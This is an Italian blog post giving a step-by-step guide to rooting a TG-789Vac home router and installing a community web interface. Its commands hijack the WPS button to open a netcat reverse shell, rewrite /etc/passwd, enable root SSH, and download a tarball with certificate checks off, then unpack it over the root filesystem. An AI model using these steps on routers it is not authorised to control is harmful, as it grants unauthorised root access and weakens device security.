---
layout: post
title:  "ROOT e Custom GUI per TG-789Vac"
date:   2019-02-25 00:00:00 
---
Guida al Root del dispositivo, con firmware UNO aggiornato all'ultima versione (17.2).  

Il router in questione è quello bianco della foto, in Italia viene distribuito da Tim o Fastweb per abbonamenti vdsl.
<a href="/media/agtot/router.png"><img src="/media/agtot/router.png" alt="Agpwi Photo" style="float: right;" />  


Se non hai ancora installato il firmware UNO eccoti la guida: [Come Flashare UNO sul TG-789Vac]({% post_url 2018-08-05-AGTOT-FW %})


><span style="color:red">**DISCLAIMER**</span>: Non mi ritengo responsabile per eventuali router brickati, eventuali gatti morti o guerre termonucleari dovute ad un malfunzionamento del suddetto prodotto.  

><span style="color:red">**NOTA**</span>: La procedura viene eseguita su Linux  



**Procedimento:**

1. Impostare netcat in ascolto sul proprio pccon: ```nc -lvvp 1337```

2. Loggarsi sul router in SSH usando come credenziali:
```
        -Username: engineer
        -Password: quella usata per loggarsi come admin nella webui
```
        
2. Dare questo comando: ```set uci.button.button.@wps.handler 'nc 192.168.1.X 1337 -e /bin/sh'```

3. Premere il pulsante laterale per far partire netcat 

4. Dare questi comandi sulla shell netcat aperta:
```
    set uci.button.button.@wps.handler 'wps_button_pressed.sh'
    sed -i 's#root:/bin/false#root:/bin:ash#' /etc/passwd
    uci set dropbear.lan.RootPasswordAuth='on'
    uci set dropbear.lan.RootLogin='1'
    uci commit
    /etc/init.d.dropbear restart
    passwd
```
Con il comando ```passwd``` chiedera' di inserire la password dell'utente root. 

5. Fine. Ora e' possibile loggarsi in SSH come root/password 


**Procedura per installare la gui di ansuel:**

><span style="color:red">**NOTA**</span>: Per evitare vari problemi alla ui, e' consigliabile aver gia' configurato il modem per la navigazione in internet.

1. Loggarsi sul router in SSH come root ( vedi sopra)

2. Dare i seguenti comandi:
```
    curl -k https://raw.githubusercontent.com/Ansuel/gui-dev-build-auto/master/GUI.tar.bz2 --output /tmp/GUI.tar.bz2
    bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -
    /etc/init.d/rootdevice force
```
A procedura finita, e' consigliabile riavviare il modem con ```reboot```

3. Godersi la nuova ui! (creata da ANSUEL, pagina [GitHub](https://github.com/Ansuel/tch-nginx-gui) )


**Fine**


<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = https://pietrotti97.com/pagine/a-router/mod-fw/2019/02/25/AGTOT-root.html;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = agtotroot; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://pietrotti97.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>




